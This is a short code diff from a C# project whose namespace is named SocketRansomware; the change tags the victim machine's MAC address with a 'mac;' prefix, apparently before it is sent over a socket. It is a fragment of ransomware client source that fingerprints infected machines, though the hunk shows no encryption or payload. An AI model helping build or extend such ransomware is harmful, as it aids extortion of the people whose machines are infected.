@@ -51,7 +51,7 @@ namespace SocketRansomware
             byte[] buffer = new byte[1024];
 
             //mac address
-            string str = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+            string str = "mac;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
 
             try
             {
